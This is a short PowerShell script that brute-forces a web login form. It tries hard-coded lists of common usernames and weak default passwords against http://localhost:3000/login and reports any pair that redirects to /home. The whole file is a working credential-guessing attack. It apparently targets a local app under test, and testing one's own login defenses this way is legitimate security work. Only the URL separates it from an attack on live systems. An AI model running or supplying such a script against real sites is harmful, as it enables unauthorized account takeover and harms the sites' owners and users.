# Set-ExecutionPolicy RemoteSigned may need to be run on powershell to enable scripts

# list of usernames to try
$usernames= @('admin','user','username','default','Admin')

# list of passwords to try
$passwords= @('password','test','p@ssw0rd123','admin','default','root')

# url to attempt login at
$Url = "http://localhost:3000/login"

# go through all possible permutations in the list of usernames
For($i=0; $i -lt $usernames.count; $i++)
{
	# go through all possible permutations in the list of usernames
	For($j=0; $j -lt $passwords.count; $j++)
	{ 
		
		$u = $usernames[$i]
		$p = $passwords[$j]
		
		# construct the request body
		$Body = @{
			username=$u
			password=$p
		}
		
		# attempt to login
		$Response = Invoke-WebRequest $Url -Body $Body -Method 'POST' -UseBasicParsing
		
		# if the login was successful, the responseuri will be '/home' instead of '/login'
		if($Response.BaseResponse.ResponseUri.AbsolutePath -eq '/home'){
			Write-Host 'login successful with u: ' $u ' p: ' $p
		}
	}
}